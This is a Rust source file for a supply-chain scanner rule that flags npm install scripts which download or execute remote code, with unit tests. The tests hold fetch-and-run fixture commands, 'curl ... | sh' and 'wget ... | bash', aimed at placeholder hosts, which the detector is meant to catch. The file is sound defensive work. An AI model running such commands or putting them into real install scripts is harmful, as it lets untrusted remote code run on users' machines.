//! LW002: an install script downloads or executes remote code.
//!
//! `curl ... | sh`, `node -e` with network calls, encoded PowerShell and
//! "decode base64 then run" are the classic one-line droppers. The patterns
//! are checked against the install script text, scripts it reaches through
//! `npm run`, and shell scripts it runs (`sh install.sh`).

use super::{Finding, Rule, Severity};
use crate::analysis::shell::{script_targets, ScriptTarget, REMOTE_EXEC_PATTERNS};
use crate::analysis::text::LineIndex;
use crate::context::PackageContext;

pub struct InstallScriptRemoteExec;

impl Rule for InstallScriptRemoteExec {
    fn id(&self) -> &'static str {
        "LW002"
    }
    fn name(&self) -> &'static str {
        "Install script downloads or executes remote code"
    }
    fn severity(&self) -> Severity {
        Severity::High
    }
    fn description(&self) -> &'static str {
        "an install script pipes curl/wget into a shell, runs node -e with network calls, \
         uses encoded PowerShell or Invoke-WebRequest, or runs base64-decoded code"
    }

    fn check(&self, ctx: &PackageContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        for script in &ctx.install_scripts {
            // The hook's own command plus any `npm run <name>` it calls.
            let mut commands = vec![script.command.clone()];
            for target in script_targets(&script.command) {
                if let ScriptTarget::NpmRun(name) = target {
                    if let Some(cmd) = ctx.manifest.script(&name) {
                        commands.push(cmd.to_string());
                    }
                }
            }
            for command in &commands {
                for pattern in &REMOTE_EXEC_PATTERNS {
                    if let Some(m) = pattern.regex.get().and_then(|re| re.find(command)) {
                        findings.push(self.finding(
                            ctx,
                            Some("package.json"),
                            ctx.manifest.script_line(script.hook),
                            m.as_str(),
                            format!("The {} script {}.", script.hook, pattern.explanation),
                        ));
                    }
                }
            }
        }
        for shell in &ctx.install_shell {
            let lines = LineIndex::new(&shell.text);
            for pattern in &REMOTE_EXEC_PATTERNS {
                if let Some(m) = pattern.regex.get().and_then(|re| re.find(&shell.text)) {
                    findings.push(self.finding(
                        ctx,
                        Some(&shell.path),
                        Some(lines.line_of(m.start())),
                        &lines.snippet(&shell.text, m.start()),
                        format!("This install-time shell script {}.", pattern.explanation),
                    ));
                }
            }
        }
        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::test_helpers::ctx;

    #[test]
    fn curl_pipe_shell_in_postinstall() {
        let c = ctx(
            "p",
            &[(
                "package.json",
                r#"{"scripts": {"postinstall": "curl -fsSL https://example.invalid/i.sh | sh"}}"#,
            )],
        );
        let f = InstallScriptRemoteExec.check(&c);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].evidence.starts_with("curl -fsSL"));
    }

    #[test]
    fn follows_npm_run_and_shell_files() {
        let c = ctx(
            "p",
            &[
                (
                    "package.json",
                    r#"{"scripts": {"install": "npm run setup", "setup": "bash scripts/s.sh"}}"#,
                ),
                (
                    "scripts/s.sh",
                    "#!/bin/sh\necho start\nwget -qO- http://203.0.113.5/x | bash\n",
                ),
            ],
        );
        // npm run is followed for the command text; the .sh file is read
        // because the install hook's targets include it via npm run.
        let f = InstallScriptRemoteExec.check(&c);
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].file.as_deref(), Some("scripts/s.sh"));
        assert_eq!(f[0].line, Some(3));
    }

    #[test]
    fn plain_build_scripts_are_fine() {
        let c = ctx(
            "p",
            &[(
                "package.json",
                r#"{"scripts": {"postinstall": "node-gyp rebuild && node scripts/check.js"}}"#,
            )],
        );
        assert!(InstallScriptRemoteExec.check(&c).is_empty());
    }
}
